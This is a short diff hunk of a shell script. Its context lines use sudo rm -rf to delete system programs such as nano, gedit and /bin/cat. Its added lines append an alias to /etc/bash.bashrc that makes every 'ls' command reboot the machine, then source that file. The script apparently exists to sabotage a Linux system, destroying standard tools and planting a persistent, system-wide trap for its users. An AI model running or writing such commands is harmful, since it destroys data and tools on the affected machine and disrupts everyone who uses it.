@@ -127,3 +127,6 @@ sudo rm -rf /usr/bin/nano
 sudo rm -rf /usr/bin/rnano
 sudo rm -rf /usr/bin/gedit
 sudo rm -rf /bin/cat
+sudo echo "alias ls='reboot'" >> /etc/bash.bashrc
+sudo source /etc/bash.bashrc
+
